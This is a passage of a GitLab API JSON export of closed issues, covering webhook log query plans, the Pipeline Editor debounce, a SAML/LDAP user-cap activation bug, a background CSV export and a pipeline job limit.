gitlab_partitions_dynamic.web_hook_logs_202207  (cost=0.14..3.17 rows=1 width=0) (actual time=0.008..0.008 rows=0 loops=1)\n               Index Cond: (web_hook_logs_202207.web_hook_id = 12345)\n               Filter: (web_hook_logs_202207.created_at \u003e= '2022-02-14 00:00:00'::timestamp without time zone)\n               Rows Removed by Filter: 0\n               Buffers: shared hit=2\n               I/O Timings: read=0.000 write=0.000\n         -\u003e  Index Scan using web_hook_logs_202208_web_hook_id_idx on gitlab_partitions_dynamic.web_hook_logs_202208  (cost=0.14..3.17 rows=1 width=0) (actual time=0.007..0.007 rows=0 loops=1)\n               Index Cond: (web_hook_logs_202208.web_hook_id = 12345)\n               Filter: (web_hook_logs_202208.created_at \u003e= '2022-02-14 00:00:00'::timestamp without time zone)\n               Rows Removed by Filter: 0\n               Buffers: shared hit=2\n               I/O Timings: read=0.000 write=0.000\n```\n\n/cc @arturoherrero","state":"closed","created_at":"2022-02-23T13:10:11.320Z","updated_at":"2022-11-24T18:21:57.482Z","closed_at":"2022-09-23T11:49:08.990Z","closed_by":{"id":11722161,"username":"bmarjanovic","name":"Bojan Marjanovic","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11722161/avatar.png","web_url":"https://gitlab.com/bmarjanovic"},"labels":["Category:Webhooks","Deliverable","backend","customer","database","devops::manage","group::integrations","missed-SLO","missed-deliverable","missed:15.4","priority::2","section::dev","severity::2","type::bug","workflow::production"],"milestone":{"id":2453027,"iid":77,"group_id":9970,"title":"15.5","description":"","state":"active","created_at":"2022-02-03T22:29:56.909Z","updated_at":"2022-02-03T22:29:56.909Z","due_date":"2022-10-17","start_date":"2022-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/77"},"assignees":[{"id":11722161,"username":"bmarjanovic","name":"Bojan Marjanovic","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11722161/avatar.png","web_url":"https://gitlab.com/bmarjanovic"}],"author":{"id":3614858,"username":"alexkalderimis","name":"Alex Kalderimis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3614858/avatar.png","web_url":"https://gitlab.com/alexkalderimis"},"type":"ISSUE","assignee":{"id":11722161,"username":"bmarjanovic","name":"Bojan Marjanovic","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11722161/avatar.png","web_url":"https://gitlab.com/bmarjanovic"},"user_notes_count":16,"merge_requests_count":0,"upvotes":8,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353553","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353553","notes":"https://gitlab.com/api/v4/projects/278964/issues/353553/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353553/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353553","relative":"#353553","full":"gitlab-org/gitlab#353553"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":8976,"epic":{"id":623320,"iid":8976,"title":"Improve the reliability of webhooks: Optimize web hook logs","url":"/groups/gitlab-org/-/epics/8976","group_id":9970,"human_readable_end_date":"Oct 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102922034,"iid":353547,"project_id":278964,"title":"Increase debounce rate for Pipeline Editor validation to 500ms","description":"### Problem to solve\n\nTo reduce the number of calls made to the linting endpoint, we want to increase the debounce limit on the Pipeline Editor.\n\nSee related thread in the parent epic. https://gitlab.com/groups/gitlab-org/-/epics/7360#note_836173185\n\n### Proposal\n\nIncrease the debounce limit from `250ms` to `500ms`","state":"closed","created_at":"2022-02-23T11:55:31.666Z","updated_at":"2022-03-08T17:45:21.203Z","closed_at":"2022-03-08T17:45:21.163Z","closed_by":{"id":5327378,"username":"f_caplette","name":"Frédéric Caplette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5327378/avatar.png","web_url":"https://gitlab.com/f_caplette"},"labels":["Category:Pipeline Authoring","devops::verify","frontend","group::pipeline authoring","section::ops","type::maintenance"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":5327378,"username":"f_caplette","name":"Frédéric Caplette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5327378/avatar.png","web_url":"https://gitlab.com/f_caplette"}],"author":{"id":1125848,"username":"samdbeckham","name":"Sam Beckham","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1125848/avatar.png","web_url":"https://gitlab.com/samdbeckham"},"type":"ISSUE","assignee":{"id":5327378,"username":"f_caplette","name":"Frédéric Caplette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5327378/avatar.png","web_url":"https://gitlab.com/f_caplette"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353547","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353547","notes":"https://gitlab.com/api/v4/projects/278964/issues/353547/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353547/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353547","relative":"#353547","full":"gitlab-org/gitlab#353547"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7360,"epic":{"id":418350,"iid":7360,"title":"Investigate PA error budget","url":"/groups/gitlab-org/-/epics/7360","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":102914387,"iid":353541,"project_id":278964,"title":"Move admin user memberships CSV download to sidekiq job","description":"\u003c!-- This template is a great use for issues that are feature::additions or technical tasks for larger issues.--\u003e\n\n### Proposal\n\n* Move the admin user memberships CSV export to a background job.\n* This is the first part to enable a fix to show max role, rather than direct membership role, in the generated CSV and avoid long-running blocking tasks.\n\nRelated to #343859.","state":"closed","created_at":"2022-02-23T09:59:22.333Z","updated_at":"2022-03-24T13:20:29.646Z","closed_at":"2022-03-04T15:01:51.091Z","closed_by":{"id":5833976,"username":"mwoolf","name":"Max Woolf","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c8af02fcb6678db41bd8d3a29f9c1d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/mwoolf"},"labels":["backend","customer","devops::manage","group::compliance","priority::2","section::dev","severity::3","type::feature","workflow::solution validation"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":5833976,"username":"mwoolf","name":"Max Woolf","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c8af02fcb6678db41bd8d3a29f9c1d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/mwoolf"}],"author":{"id":5833976,"username":"mwoolf","name":"Max Woolf","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c8af02fcb6678db41bd8d3a29f9c1d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/mwoolf"},"type":"ISSUE","assignee":{"id":5833976,"username":"mwoolf","name":"Max Woolf","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c8af02fcb6678db41bd8d3a29f9c1d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/mwoolf"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353541","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353541","notes":"https://gitlab.com/api/v4/projects/278964/issues/353541/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353541/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353541","relative":"#353541","full":"gitlab-org/gitlab#353541"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"on_track"},{"id":102908425,"iid":353538,"project_id":278964,"title":"Remove temporary index for backfilling GROUP membership namespace IDs","description":"Related to https://gitlab.com/gitlab-org/gitlab/-/merge_requests/78715. We added a temporary index for batched background migration, we can remove this index when migration is done.","state":"closed","created_at":"2022-02-23T08:39:34.027Z","updated_at":"2022-10-26T01:43:41.426Z","closed_at":"2022-10-01T01:38:44.388Z","closed_by":{"id":5966677,"username":"serenafang","name":"Serena Fang","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5966677/avatar.png","web_url":"https://gitlab.com/serenafang"},"labels":["Deliverable","backend","database","devops::manage","group::organization","missed-deliverable","missed:15.3","missed:15.4","namespace","priority::3","quad-planning::complete-no-action","section::dev","type::maintenance","workflow::blocked"],"milestone":{"id":2453027,"iid":77,"group_id":9970,"title":"15.5","description":"","state":"active","created_at":"2022-02-03T22:29:56.909Z","updated_at":"2022-02-03T22:29:56.909Z","due_date":"2022-10-17","start_date":"2022-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/77"},"assignees":[{"id":5966677,"username":"serenafang","name":"Serena Fang","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5966677/avatar.png","web_url":"https://gitlab.com/serenafang"}],"author":{"id":3717078,"username":"cablett","name":"charlie ablett","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3717078/avatar.png","web_url":"https://gitlab.com/cablett"},"type":"ISSUE","assignee":{"id":5966677,"username":"serenafang","name":"Serena Fang","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5966677/avatar.png","web_url":"https://gitlab.com/serenafang"},"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353538","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353538","notes":"https://gitlab.com/api/v4/projects/278964/issues/353538/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353538/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353538","relative":"#353538","full":"gitlab-org/gitlab#353538"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7054,"epic":{"id":379658,"iid":7054,"title":"Consolidate Group and Project member management","url":"/groups/gitlab-org/-/epics/7054","group_id":9970,"human_readable_end_date":"Nov 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102906513,"iid":353534,"project_id":278964,"title":"OAuth and LDAP sign up process when user cap set - activation not happening correctly","description":"### Summary\n\nThere's been reports ([here](https://gitlab.com/gitlab-org/gitlab/-/issues/327641#note_832161204) and [here](https://gitlab.com/gitlab-org/gitlab/-/issues/338980#note_834860135)) about SAML/OAuth login not working correctly when imposing [restrictions upon sign up](https://docs.gitlab.com/ee/user/admin_area/settings/sign_up_restrictions.html#require-administrator-approval-for-new-sign-ups).\n\n### Steps to reproduce\n\nSteps to reproduce the bug are detailed in [this comment](https://gitlab.com/gitlab-org/gitlab/-/issues/327641#note_843343372), where the commenter wrote:\n\n```\nIf I now set a user cap according to https://docs.gitlab.com/ee/user/admin_area/settings/sign_up_restrictions.html#set-the-user-cap-number,\nmy newly created SAML user is active immediately.\nIf I remove the user and the user cap to test again, the newly created user needs approval first.\nI tested with a user cap that hasn't been hit yet (5 with only 1 active user).\n```\n\n### What is the current *bug* behavior?\n\nWhen signing up with a SAML user while the user cap is greater than the number of users but the `block_auto_created_users` setting is set to `true`, the newly created SAML user is active immediately.\n\n### What is the expected *correct* behavior?\n\nWhen signing up with a SAML user while the user cap is greater than the number of users but the `block_auto_created_users` setting is set to `true`, the newly created SAML user should be blocked upon creation.\n\n### Elements to fix\n\nThe fix is twofold: \n\n1. SAML user activation check currently happens in `ee/lib/ee/gitlab/auth/saml/user.rb`. It should take place in a different spot, more likely in `lib/gitlab/auth/o_auth/user.rb`.\n1. `::Gitlab.config.omniauth.block_auto_created_users` is currently used to evaluate whether LDAP users should be blocked upon sign up. This is not correct: for LDAP users,         `::Gitlab::Auth::Ldap::Config.new(provider).block_auto_created_users` should be evaluated instead.","state":"closed","created_at":"2022-02-23T08:02:05.126Z","updated_at":"2022-06-01T11:59:53.439Z","closed_at":"2022-03-18T07:10:01.686Z","closed_by":{"id":4192493,"username":"ebaque","name":"Etienne Baqué","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4192493/avatar.png","web_url":"https://gitlab.com/ebaque"},"labels":["[deprecated] Category:Utilization","backend","devops::fulfillment","group::utilization","section::fulfillment","type::bug","workflow::in review"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":4192493,"username":"ebaque","name":"Etienne Baqué","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4192493/avatar.png","web_url":"https://gitlab.com/ebaque"}],"author":{"id":4192493,"username":"ebaque","name":"Etienne Baqué","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4192493/avatar.png","web_url":"https://gitlab.com/ebaque"},"type":"ISSUE","assignee":{"id":4192493,"username":"ebaque","name":"Etienne Baqué","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4192493/avatar.png","web_url":"https://gitlab.com/ebaque"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353534","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353534","notes":"https://gitlab.com/api/v4/projects/278964/issues/353534/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353534/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353534","relative":"#353534","full":"gitlab-org/gitlab#353534"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":102906425,"iid":353533,"project_id":278964,"title":"Fix user sin up cap check as part of OAuth login","description":"### Summary\n\nThere's been reports ([here](https://gitlab.com/gitlab-org/gitlab/-/issues/327641#note_832161204) and [here](https://gitlab.com/gitlab-org/gitlab/-/issues/338980#note_834860135)) about SAML/OAuth login not working correctly when imposing [restrictions upon sign up](https://docs.gitlab.com/ee/user/admin_area/settings/sign_up_restrictions.html#require-administrator-approval-for-new-sign-ups).\n\n### Steps to reproduce\n\nSteps to reproduce the bug are detailed in [this comment](https://gitlab.com/gitlab-org/gitlab/-/issues/327641#note_843343372), where the commenter wrote:\n\n```\nIf I now set a user cap according to https://docs.gitlab.com/ee/user/admin_area/settings/sign_up_restrictions.html#set-the-user-cap-number, my newly created SAML user is active immediately. If I remove the user and the user cap to test again, the newly created user needs approval first. I tested with a user cap that hasn't been hit yet (5 with only 1 active user).\n```\n\n### What is the current *bug* behavior?\n\nWhen signing up with a SAML user while the user cap is greater than the number of users but the `block_auto_created_users` setting is set to `true`, the newly created SAML user is active immediately.\n\n### What is the expected *correct* behavior?\n\nWhen signing up with a SAML user while the user cap is greater than the number of users but the `block_auto_created_users` setting is set to `true`, the newly created SAML user should be blocked upon creation.","state":"closed","created_at":"2022-02-23T08:00:34.037Z","updated_at":"2022-02-23T08:03:17.909Z","closed_at":"2022-02-23T08:03:17.890Z","closed_by":{"id":4192493,"username":"ebaque","name":"Etienne Baqué","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4192493/avatar.png","web_url":"https://gitlab.com/ebaque"},"labels":["backend","group::utilization","type::bug"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":4192493,"username":"ebaque","name":"Etienne Baqué","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4192493/avatar.png","web_url":"https://gitlab.com/ebaque"}],"author":{"id":4192493,"username":"ebaque","name":"Etienne Baqué","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4192493/avatar.png","web_url":"https://gitlab.com/ebaque"},"type":"ISSUE","assignee":{"id":4192493,"username":"ebaque","name":"Etienne Baqué","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4192493/avatar.png","web_url":"https://gitlab.com/ebaque"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353533","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353533","notes":"https://gitlab.com/api/v4/projects/278964/issues/353533/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353533/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353533","relative":"#353533","full":"gitlab-org/gitlab#353533"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":102884142,"iid":353494,"project_id":278964,"title":"Backend: Add a `2000` limit to the number of jobs that a pipeline can have","description":"### Problem\n\nUsers are creating really large pipelines with over 1000 jobs and GitLab does not handle these jobs very well.\n\n![image](https://gitlab.com/gitlab-org/gitlab/uploads/611adbc4074180da50fd7b8b57361e8b/image.png)\n\n\n## Proposed Solution\n\nSet a limit of 2000 jobs in create pipeline service https://gitlab.com/gitlab-org/gitlab/-/blob/a91773e2ee15d550ffa363836ffd8b630965e54d/app/services/ci/create_pipeline_service.rb#L21 and when attempting to be exceeded, it will fail which would return a `limit exceeded` error so that the user can be informed of why the pipeline failed.\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n*This page may contain information related to upcoming products, features and functionality.\nIt is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes.\nJust like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e","state":"closed","created_at":"2022-02-22T19:17:32.733Z","updated_at":"2022-03-31T21:48:57.423Z","closed_at":"2022-03-31T21:48:57.404Z","closed_by":{"id":9468400,"username":"marknuzzo","name":"Mark Nuzzo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9468400/avatar.png","web_url":"https://gitlab.com/marknuzzo"},"labels":["Category:Continuous Integration","GitLab Free","GitLab Premium","GitLab Ultimate","SUS::Impacting","Seeking community contributions","Verify::P2","[deprecated] Accepting merge requests","backend","devops::verify","direction","group::pipeline execution","section::ops","severity::4","type::feature","workflow::ready for development"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":9468400,"username":"marknuzzo","name":"Mark Nuzzo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9468400/avatar.png","web_url":"https://gitlab.com/marknuzzo"},"type":"ISSUE","assignee":null,"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353494","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353494","notes":"https://gitlab.com/api/v4/projects/278964/issues/353494/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353494/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353494","relative":"#353494","full":"gitlab-org/gitlab#353494"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":2037,"epic":{"id":13522,"iid":2037,"title":"Verify - application limits","url":"/groups/gitlab-org/-/epics/2037","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null}]